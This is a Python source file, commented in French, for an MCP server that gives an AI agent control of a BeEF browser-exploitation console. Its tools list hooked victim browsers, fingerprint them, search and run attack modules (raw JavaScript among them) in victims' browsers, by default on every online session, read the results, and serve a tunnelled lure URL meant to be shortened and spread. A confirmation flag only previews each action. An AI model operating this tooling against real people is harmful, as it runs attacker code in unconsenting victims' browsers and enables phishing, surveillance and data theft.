"""Serveur MCP BeEF : pilote la console d'operateur par l'API REST.

BeEF (Browser Exploitation Framework) expose une API REST complete mais sans
client : la seule interface graphique est la console web, qui ne se pilote qu'a
la souris. Ce serveur donne a l'agent les memes capacites en tools : lister les
navigateurs hookes, chercher un module, l'executer sur une session, lire le
resultat, detruire un hook.

Auth : jeton d'API BeEF, relu a chaque appel depuis BEEF_API_TOKEN_FILE. Le
module services/beef rend ce jeton deterministe (patch de core/main/crypto.rb +
secret sops) : BeEF en genere sinon un aleatoire a chaque demarrage et ne le
persiste nulle part.

Politique d'ecriture : executer un module, c'est du code qui tourne dans le
navigateur de la victime. `beef_run_module` et `beef_unhook` exigent donc
`confirm=True` ; sans lui, l'outil renvoie l'apercu de ce qui partirait, sans
rien envoyer.

Limite connue : BeEF imite un serveur web (web_server_imitation: apache), donc
une route inexistante rend une page 404 Apache et non un JSON d'erreur.
"""

import json
import os
import urllib.error
import urllib.parse
import urllib.request

from mcp.server.fastmcp import FastMCP

BASE_URL = os.environ.get("BEEF_URL", "http://127.0.0.1:3010").rstrip("/")
TOKEN_FILE = os.environ.get("BEEF_API_TOKEN_FILE", "")
PUBLIC_HOST_FILE = os.environ.get(
    "BEEF_PUBLIC_HOST_FILE", "/var/lib/beef/public-host")
TIMEOUT = float(os.environ.get("BEEF_TIMEOUT", "30"))

mcp = FastMCP("beef")


def _read_file(path, what):
    if not path:
        raise RuntimeError(
            "%s : chemin non configure dans la config du serveur MCP" % what
        )
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError as exc:
        raise RuntimeError("%s illisible (%s) : %s" % (what, path, exc))


def _token():
    token = _read_file(TOKEN_FILE, "jeton d'API BeEF")
    if not token:
        raise RuntimeError("jeton d'API BeEF vide dans %s" % TOKEN_FILE)
    return token


def _api(method, path, query=None, body=None):
    """Appelle l'API REST de BeEF et rend {status, body} ou {status, error}."""
    clean = {k: v for k, v in (query or {}).items() if v is not None}
    clean["token"] = _token()
    url = BASE_URL + "/api" + path + "?" + urllib.parse.urlencode(
        clean, doseq=True)
    data = None
    headers = {"Accept": "application/json"}
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=headers,
                                 method=method)
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            raw = r.read().decode("utf-8", "replace")
            return {"status": r.status,
                    "body": json.loads(raw) if raw.strip() else {}}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            payload = json.loads(raw)
        except ValueError:
            payload = raw[:2000]
        return {"status": e.code, "error": payload}
    except urllib.error.URLError as e:
        return {"status": 0, "error": "injoignable: %s" % e.reason}


def _guard(action, payload):
    return {
        "dry_run": True,
        "reason": "action qui execute du code dans le navigateur hooke : "
                  "relancer avec confirm=True",
        "action": action,
        "payload": payload,
    }


def _sessions():
    """Sessions des navigateurs en ligne, pour les tools qui en prennent une."""
    res = _api("GET", "/hooks")
    body = res.get("body") or {}
    online = (body.get("hooked-browsers") or {}).get("online") or {}
    return [b.get("session") for b in online.values() if b.get("session")]


@mcp.tool()
def beef_status() -> dict:
    """Etat du serveur BeEF : version de l'API et sessions hookees en ligne.

    Sert de smoke test : un jeton invalide rend 401 ici, un BeEF arrete rend
    « injoignable ».
    """
    version = _api("GET", "/server/version")
    mounts = _api("GET", "/server/mounts")
    hooks = _api("GET", "/hooks")
    body = hooks.get("body") or {}
    hb = body.get("hooked-browsers") or {}
    return {
        "version": version,
        "mounts": mounts,
        "online": list((hb.get("online") or {}).values()),
        "offline": len(hb.get("offline") or {}),
    }


@mcp.tool()
def beef_hooked_browsers(online_only: bool = False) -> dict:
    """Navigateurs hookes : session, navigateur, OS, page courante, dernier vu.

    `session` est l'identifiant a passer aux autres tools. Un navigateur compte
    comme en ligne s'il a pollé dans les 15 dernieres secondes (WebSocket
    desactive).
    """
    res = _api("GET", "/hooks")
    body = res.get("body") or {}
    hb = body.get("hooked-browsers") or {}
    if online_only:
        hb = {"online": hb.get("online") or {}}
    return res


@mcp.tool()
def beef_browser_details(session: str) -> dict:
    """Details d'un navigateur hooke : en-tetes, fingerprint, plugins, DOM local.

    `session` vient de beef_hooked_browsers.
    """
    return _api("GET", "/browserdetails/" + session)


@mcp.tool()
def beef_modules(search: str | None = None) -> dict:
    """Catalogue des modules BeEF (300+), ou recherche par nom si `search`.

    Chaque entree porte `id` (a passer a beef_module_options), `name` et
    `category`.
    """
    if search:
        return _api("GET", "/modules/search/" + search)
    return _api("GET", "/modules")


@mcp.tool()
def beef_module_options(mod_id: int) -> dict:
    """Options d'un module : nom, description, valeur par defaut.

    A lire avant beef_run_module : la cle attendue dans `options` est celle des
    options listees ici (ex. module 80 raw_javascript -> cle `cmd`).
    """
    return _api("GET", "/modules/" + str(mod_id))


@mcp.tool()
def beef_run_module(
    mod_id: int,
    options: dict,
    session: str | None = None,
    confirm: bool = False,
) -> dict:
    """Execute un module dans le navigateur hooke (code execute CHEZ LA VICTIME).

    Sans `session`, le module part sur TOUTES les sessions en ligne.
    `options` : dict des options du module (voir beef_module_options).
    Effet de bord reel et immediat sur la machine de la victime : exige
    `confirm=True`, sinon l'outil renvoie seulement l'apercu de l'envoi.
    Rend `command_id`, a relire avec beef_command_result.
    """
    if not confirm:
        return _guard("modules/" + str(mod_id), {
            "module_id": mod_id,
            "options": options,
            "sessions": [session] if session else _sessions(),
        })
    sessions = [session] if session else _sessions()
    if not sessions:
        return {"status": 0, "error": "aucune session hookee en ligne"}
    results = {}
    for s in sessions:
        results[s] = _api(
            "POST", "/modules/%s/%s" % (s, mod_id), body=options)
    return {"sessions": len(results), "results": results}


@mcp.tool()
def beef_command_result(session: str, mod_id: int, cmd_id: int) -> dict:
    """Resultat d'une commande deja envoyee (vide tant que le navigateur n'a
    pas repondu : le hook poll toutes les secondes)."""
    return _api("GET", "/modules/%s/%s/%s" % (session, mod_id, cmd_id))


@mcp.tool()
def beef_logs(session: str | None = None, limit: int = 40) -> dict:
    """Derniers evenements BeEF (hook, modules, erreurs). `limit` tronque la
    liste, la plus recente en dernier."""
    path = "/logs/" + session if session else "/logs"
    res = _api("GET", path)
    body = res.get("body")
    if isinstance(body, dict) and isinstance(body.get("logs"), list):
        body["logs"] = body["logs"][-limit:]
    return res


@mcp.tool()
def beef_unhook(session: str, confirm: bool = False) -> dict:
    """Retire un navigateur de la console (le hook cesse de poller).

    Une fois retire, il faut lui refaire ouvrir l'URL du leurre pour le
    recuperer : exige `confirm=True`.
    """
    if not confirm:
        return _guard("hooks/" + session + "/delete", {"session": session})
    return _api("GET", "/hooks/" + session + "/delete")


@mcp.tool()
def beef_lure_url() -> dict:
    """URL publique du leurre, celle a mettre dans un lien court.

    Le nom vient du tunnel rapide Cloudflare et change a chaque redemarrage de
    cloudflared (le module beef-tunnel-sync realigne BeEF dessus) : ne jamais
    la considerer comme stable, la relire avant chaque diffusion.
    """
    host = _read_file(PUBLIC_HOST_FILE, "hote public du leurre")
    host = host.split("//")[-1].rstrip("/")
    return {
        "host": host,
        "leurre": "https://%s/demos/basic.html" % host,
        "hook": "https://%s/hook.js" % host,
        "console": "https://beef.marcpartensky.com/ui/panel/",
    }


if __name__ == "__main__":
    mcp.run()
